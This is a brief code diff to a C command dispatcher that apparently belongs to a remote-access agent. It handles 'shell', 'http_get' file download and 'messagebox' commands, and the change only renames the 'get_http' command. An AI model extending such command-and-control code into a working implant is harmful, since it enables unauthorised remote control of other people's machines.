@@ -74,8 +74,8 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
     } else if (strcmp(command, "shell") == 0) {
         DEBUG_LOG("[COMMAND] shell\n");
         shell(response_struct, args);
-    } else if (strcmp(command, "get_http") == 0) {
-        DEBUG_LOG("[COMMAND] get_http...\n");
+    } else if (strcmp(command, "http_get") == 0) {
+        DEBUG_LOG("[COMMAND] http_get...\n");
         get_file_http(response_struct, args);
     } else if (strcmp(command, "messagebox") == 0) {
         DEBUG_LOG("[COMMAND] messagebox...\n");
